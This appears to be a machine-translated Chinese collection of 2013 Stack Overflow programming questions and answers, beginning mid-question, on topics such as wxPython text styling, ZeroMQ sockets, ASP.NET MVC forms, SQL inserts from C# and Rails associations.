        vSizer = wx.BoxSizer(wx.VERTICAL)
        vSizer.Add(panel, 1, wx.EXPAND)
        self.SetSizer(vSizer)
        self.Layout()

    def on_bold(self, event):
        start, end = self.textctrl.GetSelection()
        font = self.textctrl.GetFont()
        font.MakeBold()
        text_attr = wx.TextAttr(self.textctrl.ForegroundColour,
                                self.textctrl.BackgroundColour, font)
        self.textctrl.SetStyle(start, end, text_attr)

if __name__ == '__main__':
    wxapp = wx.App(False)
    testFrame = TestFrame(None)
    testFrame.Show()
    wxapp.MainLoop() 
```

错误

```
Traceback (most recent call last):
  File "C:/Python27/gdg", line 29, in on_bold
    font.MakeBold()
AttributeError: 'Font' object has no attribute 'MakeBold' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T12:40:06.113

```
import wx

class TestFrame(wx.Frame):
    def __init__(self, *args, **kwargs):
        super(TestFrame, self).__init__(*args, **kwargs)

        panel = wx.Panel(self)

        text = 'Highlight some text and then click the button below'

        self.textctrl = wx.TextCtrl(panel, value=text, style=wx.TE_RICH2,
                                    size=(300, -1))

        btn = wx.Button(panel, wx.ID_BOLD)
        btn.Bind(wx.EVT_BUTTON, self.on_bold)

        pSizer = wx.BoxSizer(wx.VERTICAL)
        pSizer.Add(self.textctrl, 0, wx.ALL, 5)
        pSizer.Add(btn, 0, wx.ALL, 5)
        panel.SetSizer(pSizer)

        vSizer = wx.BoxSizer(wx.VERTICAL)
        vSizer.Add(panel, 1, wx.EXPAND)
        self.SetSizer(vSizer)
        self.Layout()

    def on_bold(self, event):
        start, end = self.textctrl.GetSelection()
        font = self.textctrl.GetFont()
        font.MakeBold()
        text_attr = wx.TextAttr(self.textctrl.ForegroundColour,
                                self.textctrl.BackgroundColour, font)
        self.textctrl.SetStyle(start, end, text_attr)

if __name__ == '__main__':
    wxapp = wx.App(False)
    testFrame = TestFrame(None)
    testFrame.Show()
    wxapp.MainLoop() 
```

# c# - 检查 SIM 卡是否插入 GSMCOMM 调制解调器

> ID：15738727
> 
> 赞同：0
> 
> 时间：2013-04-01T06:31:02.490
> 
> 标签：c#, gsm

我在 C# 中使用`GSMCOMM` [http://www.scampers.org/steve/sms/libraries.htmlibrary](http://www.scampers.org/steve/sms/libraries.htmlibrary)来发送和接收短信。

所以我需要检查调制解调器是否插入了 Sim。

有没有办法在 C# 中检查这个？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T11:54:30.580

您可以尝试使用 AT 命令行读取 IMSI 号码，如果没有 SIM 卡`AT+CMEE=1; +CIMI`，这应该会给您（未插入 SIM 卡）。`+CME ERROR: 10`

有关命令的更多详细信息，请参见[27.007](http://www.3gpp.org/ftp/Specs/html-info/27007.htm)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T12:42:53.857

使用[Windows Mobile Broadband API](http://msdn.microsoft.com/en-us/library/windows/desktop/dd323269%28v=vs.85%29.aspx)（从 Windows 7 开始支持）。例如，如果您使用 IMbnConnection::GetConnectionState 获取连接状态，并且没有插入 SIM，您将获得 E_MBN_SIM_NOT_INSERTED 作为返回值。

# android - 具有形状 darwable 的 Android 动画列表无法正常工作

> ID：15738731
> 
> 赞同：1
> 
> 时间：2013-04-01T06:31:27.180
> 
> 标签：android, animation, shape, animationdrawable

我正在尝试在不同的图像资源之间做动画。因此，我正在使用帧动画。

列表动画.xml

```
 <?xml version="1.0" encoding="utf-8"?>
<animation-list xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/music_playing_indicator_1"
        android:oneshot="false">
                <item android:drawable="@drawable/animation_1" android:duration="500" />
                <item android:drawable="@drawable/animation_2" android:duration="50" />
                <item android:drawable="@drawable/animation_4" android:duration="50" />
                <item android:drawable="@drawable/animation_5" android:duration="50" />
                <item android:drawable="@drawable/animation_2" android:duration="80" />
                <item android:drawable="@drawable/animation_1" android:duration="150" />
                <item android:drawable="@drawable/animation_3" android:duration="600" />
                <item android:drawable="@drawable/animation_2" android:duration="250" />
</animation-list> 
```

动画_1 - 5.xml

```
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android"
    android:shape="rectangle" >

    <size
        android:height="2dp"
        android:width="2dp" />

    <solid android:color="#ffffff" />

</shape> 
```

我只是将高度从 2dp 调整到 4dp 到 6dp 到 8dp 到 10dp。
动画_1 2dp 动画
_2 4dp 动画_3
6dp 等等。

在我运行动画之后，当然我将 imageview 的背景设置为我的动画列表可绘制对象。

```
ImageView img = (ImageView) getView().findViewById(R.id.Animation);
        AnimationDrawable frameAnimation = (AnimationDrawable) img
                .getBackground();
        frameAnimation.start(); 
```

但这里的问题是动画似乎不是应该的动画。有时它很慢，根本没有动画。

如果我对真实的 .png 文件做同样的事情。不同高度的animation_1 -5.png 完美运行。我现在很困惑。在动画列表中使用形状有什么限制吗？

我使用形状的原因是更容易针对具有不同屏幕尺寸的不同设备等等。

我很感谢任何帮助...

干杯亚历克斯

# javascript - 如何将 .js 链接包含到另一个 .js 中？

> ID：15738735
> 
> 赞同：2
> 
> 时间：2013-04-01T06:31:34.577
> 
> 标签：javascript, include

好的，假设我有这两个链接

```
<script src="http://code.jquery.com/jquery-latest.js"></script>
<script type="text/javascript" src="http://dev.jquery.com/view/trunk/plugins/validate/jquery.validate.js"></script> 
```

我使用这些作为我的 javascript 源

我创建了另一个名为

```
<script src="testing.js"></script> 
```

但是在我的 html 中，我想显示脚本 src="testing.js" 我能够以某种方式将前两个链接放入 testing.js 文件中吗？

所以在我的html中它只会显示

```
<script src="testing.js"></script> 
```

但实际上它正在运行三个脚本......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:36:04.317

您不能直接`.js`从文件链接`.js`文件

检查这个：[如何在另一个 JavaScript 文件中包含一个 JavaScript 文件？](https://stackoverflow.com/questions/950087/include-javascript-file-inside-javascript-file)

它清楚地说明了如何`.js`在`.js`文件中链接 a

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:39:38.910

about.com 的解决方案：

在您的`testing.js`文件中创建此函数：

```
function addJavascript(jsname,pos) {
var th = document.getElementsByTagName(pos)[0];
var s = document.createElement('script');
s.setAttribute('type','text/javascript');
s.setAttribute('src',jsname);
th.appendChild(s);
} 
```

稍后使用以下方法调用该函数：

```
addJavascript('http://code.jquery.com/jquery-latest.js','head');
addJavascript('http://dev.jquery.com/view/trunk/plugins/validate/jquery.validate.js','head'); 
```

其他方式很少，但并非所有方式都与所有浏览器兼容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T06:35:09.063

您只能在 HTML 页面中包含脚本文件，而不能在另一个脚本文件中包含

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T06:43:35.757

您可以使用 requireJS 来异步加载 JS 文件。如果这是一个选项，可以在此处找到[帮助您入门的教程。](http://requirejs.org/docs/jquery.html)

PS我知道这不是OP所要求的，但要求与此非常相似。

# objective-c - 日期@“2013-04-19T05:29:59 05:30”的日期格式化程序

> ID：15738739
> 
> 赞同：0
> 
> 时间：2013-04-01T06:31:48.837
> 
> 标签：objective-c

我尝试通过 @"YYYY-MM-dd'T'HH:mm:ss'+05:30'" 格式化以上日期

但是日期错误（2012-04-18 23:59:59 +0000）谁能帮助我在任何地方都没有找到这种格式

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:53:08.690

你得到了正确的值。但是是 GMT 格式。这就是你输入的时间是 +5:30 并且你得到的值是 GMT 格式看到答案最后有 +0000 表明它是 GMT 格式.要检查添加 5:30 的结果，您将获得您提供的正确值。用于`NSDateFormatter`获取正确的日期格式

您在这里缺少的是 ss 和 05:30 之间的空格，正确的格式是

```
@"YYYY-MM-dd'T'HH:mm:ss '05:30'" 
```

使用它来获得正确的输出

```
 NSDateFormatter *dateFormatter=[[NSDateFormatter alloc]init];
    [dateFormatter setDateFormat:@"YYYY-MM-dd'T'HH:mm:ss '05:30'"];
    NSDate *dateObj= [dateFormatter dateFromString:@"2013-04-19T05:29:59 05:30"];
    NSLog(@"%@",dateObj);
    [dateFormatter setDateFormat:@"EEEE MMMM d, YYYY"];
    NSLog(@"%@",[dateFormatter stringFromDate:dateObj]); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:38:11.813

通常的反应是使用`strftime`函数/方法，但由于您没有指定任何平台或框架，这是您可以获得的最佳答案；`strftime`在您选择的框架中搜索功能。

# python - 将类成员调用到对象列表的所有元素的紧凑方法

> ID：15738743
> 
> 赞同：0
> 
> 时间：2013-04-01T06:32:33.263
> 
> 标签：python

问题：如何为这个循环定义一个紧凑的结构：

```
for V in L:
   V.f() 
```

在哪里：

*   `L`: 是给定类型的对象列表`A`
*   `f()`: 一种方法`A`。

例如：

```
class A:
    def f(self):
        print "foobar... "

# Construct the list
a1 = A()
a2 = A()
a3 = A()
L = [a1, a2, a3]

for V in L:
    V.f() 
```

我找到了一种使用 map 调用和 lambda 函数的方法：

```
 map(lambda x: x.f(), L) 
```

但是，此调用返回一个列表，我不想构造它。

有没有更优雅的方式来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:50:31.210

正确的方法是使用您提到的循环。任何其他解决方案在语义上都是不正确的。

（您所说的是“对于 L 中的每个项目，执行 f。”也就是说，您是命令式的。for 循环正是如此。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:43:40.290

如果您不希望将列表作为返回值，那么您的 for 循环是最好的方法。

```
for V in L:
    V.f() 
```

或者，您可以使用 python 的最佳功能之一，列表推导，而不是将其分配给任何变量。列表推导通常更快。

```
[ V.f() for V in L] 
```

# excel - 使用 SSIS 将 excel 导出到 sqlserver

> ID：15738746
> 
> 赞同：0
> 
> 时间：2013-04-01T06:33:01.053
> 
> 标签：excel, ssis, sql-server-2012

我正在使用 SSIS 包将 excel 数据导出到 sqlserver 数据库。我成功了，我能够将数据插入到 sqlserver 表中。为此，我使用了以下步骤。1\. 添加 Excel 源 2\. 数据转换层 3\. OLEDB 目标

当我运行包时，我能够插入数据。现在我的要求是，如果在 excel 中完成了任何更改，并且当我们重新运行 SSIS 包时，必须更新数据库而不是尝试插入，因为它会因为主键而出错。我已经厌倦了以下方式，在 OLEDB 目标配置中，我从下拉列表中选择了 sqlcommand 选项而不是表视图，并在命令框中添加了以下查询

```
Insert into unicode(ID
      ,Description
      ,Start_Date
      ,End_Date
      ,Start_of_week
      ,Is_Shift_allowed
      ,Any_other_info) Select ID
      ,Description
      ,Start_Date
      ,End_Date
      ,Start_of_week
      ,Is_Shift_allowed
      ,Any_other_info FROM OPENROWSET('Microsoft.Jet.OLEDB.4.0;Data Source=D:\Files\backup\MasterList.xls;Extended Properties=EXCEL 8.0;HDR=YES','SELECT * FROM [Project$]') 
```

当我单击解析查询时，它显示异常为 sysnatx 错误“）”。欢迎任何建议！.. 谢谢 Sangita 'SELECT * FROM [Project$]')

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T15:13:20.280

我认为你应该使用预加载表，每次启动 etl 时，它都会先被截断（使用 sql taks），然后填充 excel 数据。之后添加另一个 sql 任务并使用列 EndDate 编写合并语句（插入/更新）。

# shell - 纯 shell 脚本与部署工具

> ID：15738749
> 
> 赞同：2
> 
> 时间：2013-04-01T06:33:26.730
> 
> 标签：shell, deployment, capistrano, fabric

我正在努力尝试在我们的项目中替换（改进）我们的部署过程，尽可能地使其自动化。目前我们正在使用纯 shell 脚本。我对 Fabric 和 Capistrano 进行了一些研究，看看它们是否可以帮助我们实现部署自动化。

部署工具（即 Capistrano、Fabric）与使用 shell 脚本的作用几乎相同。

除了拥有一门高级编程语言之外，与普通的 shell 脚本相比，使用部署还有什么优势？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:37:34.827

我认为部署的正确“适合”与部署的规模、复杂性和操作配置文件有很大关系。如果您的应用程序在单台机器上运行，并且您只偶尔启动一次新实例，并且您实际上可以完全在 shell 中成功地自动化它，那么请算上您的祝福并尽可能使用该 shell 脚本。简单是有价值的。

在某些时候，随着您的部署架构、集群规模、团队规模、登台/测试环境的数量、部署频率等的增长，使用 Fabric 或类似的东西升级到下一个复杂级别是有意义的。既有成本，也有优势。主要优点，或者我认为的方式，在 shell 脚本中很难满足的要求，例如同时远程部署到多个目标，将脚本幂等地重新应用到已经部署的实例。不要沉迷于高级语言（python、ruby 等）、您可以使用的第三方模块等的流畅性。坚持基础。只需为您真正需要满足要求的部署复杂性付费，当简单的脚本工作时，坚持使用它们。案例分析：许多 Solaris 以 Korn shell 脚本的形式存在，并且已经正常工作了 10 多年。少量的 Fabric/Capistrano/Puppet/Chef/Etc 编排一组可靠的 shell 脚本可以处理大部分中等范围的部署范围。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:38:17.380

使用预先存在的工具的最大优势是，您不必为要部署的每个软件都重新发明轮子。[Puppet Forge](https://forge.puppetlabs.com/)等存储库可能包含适合您的解决方案。如果他们不这样做，您可以随时与社区分享您的解决方案。*交换条件*等等。

# performance - 更好：字符串 html 生成与 jquery DOM 元素创建性能明智吗？

> ID：15738750
> 
> 赞同：1
> 
> 时间：2013-04-01T06:33:27.780
> 
> 标签：performance, jquery-ui, jquery, jquery-plugins

```
 var str = '<table class="bndotamntbl" cellspacing="0" cellpadding="0" border="0">';
        str += '<tbody>';

        /*Create Header [Properties]*/
        str += '<tr>';
  str += '<td>'; SOME CONTENT

dv.innerHTML = str ; 
```

VS

```
 var tbl = $('<table></table>').attr({ id: "tblContent" },{cellspacing: "0" },{cellpadding: "0"},{border: "0"}).addClass("bndotamntbl");
 $('<div>').attr({id:}).append(tbl); 
```

更好：字符串 html 生成与 jquery DOM 元素创建性能明智？请解释..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T07:46:15.967

第一个将在`dv.innerHTML = str;`执行时添加到 DOM，但在后面的示例中，`$('<table></table>')`您同时将节点添加到 DOM。

就像 Mustache.js 等大多数模板引擎一样（编译 html 字符串），第一种情况似乎还可以。

# internet-explorer - SVG 动画不能在 IE9/IE10 上运行

> ID：15738752
> 
> 赞同：10
> 
> 时间：2013-04-01T06:33:31.860
> 
> 标签：internet-explorer, animation, svg

嗨，我有一段`HTML`代码，它基本上是一个 SVG 动画。这在 Chrome 和 Firefox 中都可以正常工作，但在 IE9/IE10 中则不行。

有什么解决办法吗？

需要至少在 Chrome/Firefox/IE 9 及更高版本中工作的单一代码库。

```
<!DOCTYPE html>  
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
</head>

<body>

    <div id='svgnotsupported' style='visibility: hidden;'>
        <h1>This application requires SVG support</h1>
    </div>

    <div id='svgsupported' style='visibility: hidden'></div>

    <script>

        var svgsupport;

        window.onload = function supportsSvg() {

            var ua = navigator.userAgent;
            var M = ua.match(/(chrome)\/?\s*(\.?\d+(\.\d+)*)/i);
            var b =   document.implementation.hasFeature("http://www.w3.org/TR/SVG11/feature#BasicStructure",  "1.0")
            if(b || M) {
                svgsupport = document.getElementById('svgsupported');
            } else {
                svgsupport = document.getElementById('svgnotsupported');
            }

            svgsupport.style.visibility = 'visible';

        }

    </script>

    <svg id="no_fewer_than_N_events_E_between_event_Q_and_first_R_thereafter" width="588" height="578" version="1.1" xmlns="http://www.w3.org/2000/svg">
        <defs>
            <marker id="Triangle" viewBox="0 0 20 20" refX="20" refY="10" markerUnits="strokeWidth" markerWidth="8" markerHeight="6" orient="auto">
                <path d="M 0 0 L 20 10 L 0 20 z" fill="blue"/>
            </marker>
            <marker id="Circle" viewBox="0 0 10 10" refX="5" refY="5" markerUnits="strokeWidth" markerWidth="6" markerHeight="6" orient="auto">
                <circle cx="5" cy="5"  r="3" fill="blue"/>
            </marker>
        </defs>
        <g>
            <path id="_4JpShw3P09cVj6Vb1lR041" d="M 399.0,228.0 a 20.0 40.0, 0, 1, 0, 54.0 0.0" style="fill:none;stroke:blue ;stroke-width:3" marker-end="url(#Triangle)" />
            <rect id="anim_4JpShw3P09cVj6Vb1lR041" x="-5" y="-5" width="10" height="10" fill="red">
            <animateMotion  path="M 399.0,228.0 a 20.0 40.0, 0, 1, 0, 54.0 0.0" dur="5s" rotate="auto" repeatCount="indefinite" begin="1s"  />
            </rect> 
        </g>
        <g>
            <rect id="_0uuE73jF5kmqe14s6Y02NF" x="372" y="165" rx="10.0" ry="6.0" width="109" height="63" style="fill:white;stroke:black;stroke-width:4;opacity:0.5">
                <animate id="anim_0uuE73jF5kmqe14s6Y02NF" attributeName="stroke" attributeType="CSS" from="lime" to="black" dur="2s" repeatCount="indefinite" />
            </rect>
        </g>
    </svg>

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-01T08:43:08.183

您可以使用[FakeSmile](https://leunen.me/fakesmile/)库为 IE 添加动画支持。

# asp.net-mvc - 在 Controller 中获取 HTML 控件值

> ID：15738754
> 
> 赞同：7
> 
> 时间：2013-04-01T06:33:51.377
> 
> 标签：asp.net-mvc

我想在控制器中获取 HTML 文本框值。下面是我的查看代码

```
@using (Html.BeginForm("SaveValues", "TestGrid",FormMethod.Post))
{
<table>
 <tr>
    <td>Customer Name</td>
    <td>
        <input id="txtClientName" type="text" />
     </td>
    <td>Address</td>
    <td>
        <input id="txtAddress" type="text" /></td>
    <td>
        <input id="btnSubmit" type="submit" value="Submit" /></td>
    </tr>
</table>} 
```

请检查下面的控制器代码以获取值

```
[HttpPost]
    public ActionResult SaveValues(FormCollection collection)
    {
        string name = collection.Get("txtClientName");
        string address = collection.Get("txtAddress");
        return View();
    } 
```

我得到空值

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-01T06:37:38.383

将名称属性添加到您的输入字段，例如：

```
<input id="txtClientName" name="txtClientName" type="text" /> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-05-14T17:01:21.410

如果您在视图中声明所有控件

```
@using (Html.BeginForm())
{
//Controls...
} 
```

ASP.NET（WebPages、MVC、RAZOR）使用 HTTP 协议作为客户端和服务器之间交互的基础。为了使 HTTP 将客户端值传递到服务器端，所有 HTML 元素都必须定义名称属性。HTML 元素中的 id 属性仅供前端使用。（CSS、JavaScript、JQuery 等）。有关工作示例，请参见下面的代码行；

```
<input type="text" name="zzzz" id="xxxx"/> 
```

然后在控制器中，您可以使用 FormCollection 对象访问控件。它包括使用名称属性描述的所有控件。

```
//
// POST:
[HttpPost]
public ActionResult CreatePortal(FormCollection formCollection)
{
    // You can access your controls' values as the line below.
    string txtValue = formCollection["zzzz"]; 

    //Here is you code...
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-10T12:40:36.920

要通过表单集合获取控制器中的 HTML 控件值，您需要在 HTML 控件中添加“名称”属性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-01T08:22:39.740

我 Asp.net MVC Html.BeginForm 使用 html 元素的 name 属性进行序列化。然后你必须填写 html 元素的 name 属性

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-02-10T12:16:36.777

尝试这个：

```
Request.Form["controlID"] 
```

# c# - 在表中插入多个值？

> ID：15738761
> 
> 赞同：0
> 
> 时间：2013-04-01T06:34:36.043
> 
> 标签：c#, sql, vb.net, winforms, visual-studio-2010

以下代码可以在一行表中插入新值。但是当我尝试插入多个值时，在输出中这些值会在表中保存两次。

请帮助我获取可以在我的表中插入多个值的代码。

```
private void Form1_Load(object sender, EventArgs e)
 {
 String strConnection = "Data Source=HP\\SQLEXPRESS;database=MK;Integrated Security=true";

 SqlConnection con = new SqlConnection(strConnection);
 try
 {

 con.Open();

 SqlCommand sqlCmd = new SqlCommand();

 sqlCmd.Connection = con;
 sqlCmd.CommandType = CommandType.Text;
 sqlCmd.CommandText = "Select table_name from information_schema.tables";

 SqlDataAdapter sqlDataAdap = new SqlDataAdapter(sqlCmd);

 DataTable dtRecord = new DataTable();
 sqlDataAdap.Fill(dtRecord);
 comboBox1.DataSource = dtRecord;
 comboBox1.DisplayMember = "TABLE_NAME";
 comboBox1.ValueMember = "TABLE_NAME";

 con.Close();
 }
 catch (Exception ex)
 {
 MessageBox.Show(ex.Message);
 }
 }
 private void dataGridView1_RowEnter(object sender, DataGridViewCellEventArgs e)
 {
 var collection = this.dataGridView1.Rows;
 string output = "";
 foreach (DataGridViewRow row in collection)
 {
 foreach (DataGridViewCell cell in row.Cells)
 {
 if (cell.Value != null)
 {
 output += cell.Value.ToString() + " ";
 this.Text = output;
 }
 }
 }
 }
 private void PopulateGridView(string tablename)

 {

 if (tablename == "System.Data.DataRowView")
 return;
 String strConnection = "Data Source=HP\\SQLEXPRESS;database=MK;Integrated Security=true";

 SqlConnection con = new SqlConnection(strConnection);
 try
 {

 con.Open();

 SqlCommand sqlCmd = new SqlCommand();

 sqlCmd.Connection = con;
 sqlCmd.CommandType = CommandType.Text;
 sqlCmd.CommandText = "Select * from " + tablename;

 SqlDataAdapter sqlDataAdap = new SqlDataAdapter(sqlCmd);

 DataTable dtRecord = new DataTable();
 sqlDataAdap.Fill(dtRecord);
 dataGridView1.DataSource = dtRecord;

 con.Close();
 }
 catch (Exception ex)
 {
 MessageBox.Show(ex.Message);
 }
 }

 private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
 {

 if (comboBox1.SelectedValue != null)
 {
 PopulateGridView(comboBox1.SelectedValue.ToString());
 }
 }
 private void InsertInfo()
 {
 string connectionString = null;
 SqlConnection connection;
 SqlDataAdapter adapter = new SqlDataAdapter();

 connectionString = @"Data Source=HP\SQLEXPRESS;database=MK;Integrated Security=true";
 connection = new SqlConnection(connectionString);

        foreach (int rowIndex in lstNewRows)
        {

            string insrtQry = "insert into " + comboBox1.Text + " values(";

            foreach (DataGridViewCell cell in dataGridView1.Rows[rowIndex].Cells)
            {
                insrtQry += "'" + cell.Value.ToString() + "',";
            }

            insrtQry = insrtQry.TrimEnd(",".ToCharArray());

            insrtQry += ")";

 try
 {
 connection.Open();
 adapter.InsertCommand = new SqlCommand(insrtQry, connection);
 adapter.InsertCommand.ExecuteNonQuery();

 MessageBox.Show("Row inserted !! ");
 connection.Close();
 }
 catch (Exception ex)
 {
 MessageBox.Show(ex.ToString());
 }
 }
 }

 private void insert_Click(object sender, EventArgs e)
 {
 InsertInfo();
 }

 private void dataGridView1_DefaultValuesNeeded(object sender, DataGridViewRowEventArgs e)
 {
 lstNewRows.Add(e.Row.Index);
 }

 }
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:56:02.140

尝试改变：

```
string insrtQry = "insert into " + comboBox1.Text + " values("; 
```

至：

```
string insrtQry = "INSERT INTO table_name (field1, field2, field3) VALUES (@value1, @Value2, @value3)" 
```

还可以通过点击此处的链接在 MSDN.Microsoft.com 上查看 SQL 插入语句[。](http://social.msdn.microsoft.com/forums/en-US/csharpgeneral/thread/91bd10ce-c83b-4766-920b-2137ddc29908)

祝你的代码好运！

更新：

好吧，我开始明白你在做什么。您可以尝试将组合框变成一个变量，例如：

```
if (comboBox1.Text  == "table1")
{
string insrtQry = "INSERT INTO table_name (field1, field2, field3) VALUES 
(@value1, @Value2, @value3)" 
} 
else
{ 

 string insrtQry = "INSERT INTO table_name2 (field1-2, field2-3, field3-4) VALUES 
 (values1, values2, values3)" 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T07:00:08.947

我更喜欢表值类型并将其传递给存储过程 [或内联查询，尽管我不喜欢它] 检查此链接以获取详细信息

[http://www.christian-etter.de/?tag=sqldbtype-structured](http://www.christian-etter.de/?tag=sqldbtype-structured)

# jquery - 如何创建将在 Rails 中执行 js 代码的链接

> ID：15738762
> 
> 赞同：0
> 
> 时间：2013-04-01T06:34:40.437
> 
> 标签：jquery, ruby-on-rails, ruby-on-rails-3

我想知道如何在将执行 js/jquery 代码的视图（index.html.erb）中创建一个链接。

我正在使用[https://github.com/akzhan/jwysiwyg](https://github.com/akzhan/jwysiwyg)并希望隐藏编辑器，但不知道该怎么做。

现在我正在做

编辑 -

index.html.erb

```
<%= link_to "Hide", "#", onclick: "$('#email_body').hide();" %> 
```

index.js.erb

```
$('#wysiwyg').wysiwyg('clear'); 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:52:26.517

您可以为此使用 rails link_to 助手：

```
link_to "Hide", "#", confirm: "Are you sure?", onclick: "$('#wysiwyg').wysiwyg('clear');" 
```

更好的编码实践是将 JavaScript 代码与视图代码分开，例如：

```
link_to "Hide", "#", id: 'hide_editor' 
```

然后，在一个单独的 JavaScript 文件中：

```
(function(){
  $('#hide_editor').on('click', function(){
    $('#wysiwyg').wysiwyg('clear');
  });
})(); 
```

然后在结束 BODY 标记之前放置一个指向此 JS 的链接。

更新：正如我所见，这个插件不支持禁用，您可以通过隐藏容器来禁用它：`$('#wysiwyg').hide();`

`$('#wysiwyg').wysiwyg('clear')`正如我在文档中看到的那样，清除编辑器的内容。

UPDATE2：@iCyborg，根据您的代码，这里是工作示例： http: [//jsbin.com/esuyij/1/](http://jsbin.com/esuyij/1/)

UPDATE3：我研究了这个编辑器，发现它的自定义选项不够灵活。我可以建议你看看其他编辑器吗？例如这里有一个阵容： [http ://www.jquery4u.com/plugins/html5-wysiwyg/](http://www.jquery4u.com/plugins/html5-wysiwyg/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:48:49.703

尝试：

```
<a href="#" onclick="$('#wysiwyg').wysiwyg('clear');" id="NOT_SURE_WHAT_ID_TO_GIVE">Hide Editor Controls</a> 
```

# c# - 无法接收来自 ZeroMQ (ØMQ) 的确认

> ID：15738768
> 
> 赞同：0
> 
> 时间：2013-04-01T06:35:24.327
> 
> 标签：c#, node.js, zeromq

**场景**：我可以使用以下代码通过 ZeroMQ (ØMQ) 将字符串类型的数据从 C# 发送到 Node.JS 应用程序：
C# 推送代码：

```
using (var context = new Context(1))
                {
                    using (Socket client = context.Socket(SocketType.PUSH))
                    {
                        client.Connect("tcp://127.0.0.1:12345");
                        int i = 0;
                        while (true)
                        {
                            string request = i.ToString() + "_Hello_ ";
                            i++;
                            Console.WriteLine("Sending request..." + i.ToString());
                            client.Send(request, Encoding.Unicode); 

                              // <== Here is the issues    
                            string reply = client.Recv(Encoding.Unicode).ToString(); 
                              // <== Here is the issues

                            Console.WriteLine("Received reply :", reply);
                        }
                    }
                } 
```

Node.JS 拉取代码：

```
pull_socket.bindSync('tcp://127.0.0.1:12345')

pull_socket.on('message', function (data) {
    i++;
    console.log(i.toString() + 'received data:\n');
    console.log(data.toString());
    pull_socket.send('rcvd'); // <== Here is the issues
}); 
```

**问题**：在 C#`reply`对象中将包含字符串`"Not supported"`，但发送的数据将在 Node.js 中正确接收。

**问题**：谁能告诉我我做错了什么？请稍微说明一下这个问题。

高级感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T07:28:17.870

它通过使用不同的套接字类型 REQ/REP 而不是 PUSH/PULL 解决了
以下是代码：
C# 推送代码：

```
using (var context = new Context(1))
                {
                    using (Socket client = context.Socket(SocketType.REQ))
                    {
                        client.Connect("tcp://127.0.0.1:12345");
                        int i = 0;
                        while (true)
                        {
                            string request = i.ToString() + "_Hello_ ";
                            i++;
                            Console.WriteLine("Sending request..." + i.ToString());
                            client.Send(request, Encoding.Unicode); 

                            string reply = client.Recv(Encoding.Unicode).ToString();

                            Console.WriteLine("Received reply :" + reply);
                        }
                    }
                } 
```

Node.JS 拉取代码：

```
var rep_socket = zmq.socket('rep')
rep_socket.bindSync('tcp://127.0.0.1:12345')

rep_socket.on('message', function (data) {
    i++;
    console.log(i.toString() + 'received data:\n');
    console.log(data.toString());
    pull_socket.send('hello WORLD'); // <== Here is the issues
}); 
```

C# 控制台上的输出：

```
Sending request...0
Received reply: hello WORLD 
```

# ruby-on-rails - rails through 关联，包括同一张表

> ID：15738770
> 
> 赞同：0
> 
> 时间：2013-04-01T06:35:38.213
> 
> 标签：ruby-on-rails, activerecord, include, associations, has-many-through

```
class Film < ActiveRecord::Base
  has_many :film_casts
  has_many :derectors, :through => :film_casts, :source => :cast, :conditions => ['film_casts.type_id = 0']
  has_many :performers, :through => :film_casts, :source => :cast, :conditions => ['film_casts.type_id = 1']
end

class Cast < ActiveRecord::Base
end  

class FilmCast < ActiveRecord::Base
  # type_id  0 => derector, 1 => performer

  belongs_to :film
  belongs_to :cast
end 
```

`irb(main):001:0> films = Film.includes(:performers, :derectors).limit(5)`

```
 Film Load (0.3ms)  SELECT `films`.* FROM `films` LIMIT 2
  FilmCast Load (0.3ms)  SELECT `film_casts`.* FROM `film_casts` WHERE `film_casts`.`film_id` IN (1, 2) AND (film_casts.type_id = 1)
  Cast Load (0.4ms)  SELECT `casts`.* FROM `casts` WHERE `casts`.`id` IN (2, 3, 4, 5, 6, 7, 9, 10, 11, 12) 
```

问题是，为什么它只包括`:performers`？如何将两者都包含在同一个表中？

# r - 如何从循环和 if 语句创建二进制变量

> ID：15738774
> 
> 赞同：4
> 
> 时间：2013-04-01T06:35:54.617
> 
> 标签：r, if-statement, for-loop

假设我有一个`x`包含 0 到 2 之间的 20 个值的向量。

```
x = runif(20, 0, 2) 
```

现在，我想`y`在以下条件下创建另一个仅包含 0 和 1 的向量（二进制变量）：`y = 0`if`x < 1`和`y = 1`in case `x > 1`。

我尝试通过`if`以下方式使用循环和语句来做到这一点：

```
x = runif(20, 0, 2) # Create a vector of 20 values between 0 and 2
y = rep(5, 20) # Create a vector of 20 values (only 5's)

for(i in 1:length(x)) # Loop that assigns values to the y vector depending on x
{
  if(x < 1)
  {
    y[i] = 0
  }
  else
  {
    y[i] = 1
  }
} 
```

